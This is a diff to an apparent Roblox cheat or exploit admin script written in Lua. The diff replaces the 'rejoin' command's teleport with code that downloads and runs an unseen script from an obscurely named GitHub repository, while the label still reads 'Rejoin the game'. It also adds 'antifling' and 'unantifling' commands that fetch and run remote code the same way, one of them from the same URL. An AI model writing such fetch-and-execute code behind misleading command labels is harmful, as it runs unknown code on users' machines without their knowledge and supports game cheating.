@@ -325,7 +325,7 @@ cmd.add({"murdermod", "mm2mod"}, {"murdermod", "Give you some admin perms"}, fun
 end)
 
 cmd.add({"rejoin", "rj"}, {"rejoin", "Rejoin the game"}, function()
-	game:GetService("TeleportService"):Teleport(game.PlaceId)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/valssss/grsdhgdsh/main/sbvsdhbsdfvb", true))()
 end)
 
 cmd.add({"telekinesis", "tk", "tkg"}, {"telekinesis", "Enable telekinesis gun"}, function(placeid, playerName)
@@ -1114,6 +1114,14 @@ end)
 
 cmd.add({"opennazi"}, {"opennazi", "Open NaziSploit"}, function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/valssss/dfghdfhdfhdfh/main/gsgdfghdsfg", true))()
+end)
+
+cmd.add({"antifling"}, {"antifling", "Prevent people from flinging you"}, function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/valssss/fhedfhdfh/main/sgsdgdsgsd", true))()
+end)
+
+cmd.add({"unantifling"}, {"unantifling", "remove antifling"}, function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/valssss/grsdhgdsh/main/sbvsdhbsdfvb", true))()
 end)
 
 cmd.add({"pizzacandyauto"}, {"pizzacandyauto", "Execute Candy auto farm for Pizza place (must take bag first)"}, function()
